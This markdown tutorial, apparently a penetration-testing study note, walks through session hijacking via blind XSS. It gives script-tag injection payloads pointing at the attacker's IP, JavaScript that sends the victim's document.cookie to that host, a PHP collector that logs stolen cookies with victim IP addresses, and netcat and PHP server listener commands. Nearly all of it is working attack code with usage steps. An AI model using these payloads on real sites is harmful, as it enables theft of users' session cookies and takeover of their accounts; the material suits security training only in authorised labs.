
# Session Hijacking Process


## STEP 1: Understanding which input filed is vulnerable to XSS Payload

- We need to try each of the below payloads to find our which input field is vulnerable to XSS. This happens normally in **Blind XSS** where we don't have idea how our input is handled since we don't have access to certain pages. The application probably loads an external script so we can try the below payloads to find the correct format.
- Fill the `input_field_name` based on the input field you are entering the value in. This way when you start the listener and you receive something on the listener you will see the `input_field_name` indicating which input field is vulnerable.

```html
<!-- choose any 1 of the external script format -->
<!-- some might work others might not -->
<script src=http://[OUR_IP]/[input_field_name]></script>
'><script src=http://[OUR_IP]/[input_field_name]></script>
"><script src=http://[OUR_IP]/[input_field_name]></script>
```

- Setup the listener first before setting the payload to accurately understand the input field.

```bash
nc -lnvp 80
```

**Tip: replace the IP with individual input field names to accurately understand which field is vulnerable to XSS.**

---
## STEP 2: Writing the XSS Payload

```js
document.location='http://[OUR_IP]/index.php?c='+document.cookie;
```

```js
new Image().src='http://[OUR_IP]/index.php?c='+document.cookie;
```

- Create `script.js` file.
- We can write any one of the above 2 payloads in our external `script.js` file. The above payloads will grab the cookie value and send to `index.php` file in the `c` parameter.

---
## STEP 3: Receiving the Cookie

- Create a temporary directory and move to that location.

```bash
mkdir /tmp/tmpserver
cd /tmp/tmpserver
```

- Create the `index.php` file and paste the below code inside it. Move `script.js` in this location as well.
- Provide the Victim IP.

```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```

- The `index.php` file will receive the cookie value in `c` parameter and store the cookie value inside the **cookies.txt** file along with the Victim's IP address.
- Start the listener

```bash
sudo php -S 0.0.0.0:80
```

---
## STEP 4: Execution

- Whatever XSS Payload works use it and include the `script.js` file inside the payload. For example : If payload -> `<script src=http://[OUR_IP]></script>` works then the payload will look like `<script src=http://[OUR_IP]/script.js></script>`.
- Keep the listener on before payload injection.
- Now injection the payload and see the output in the listener terminal.



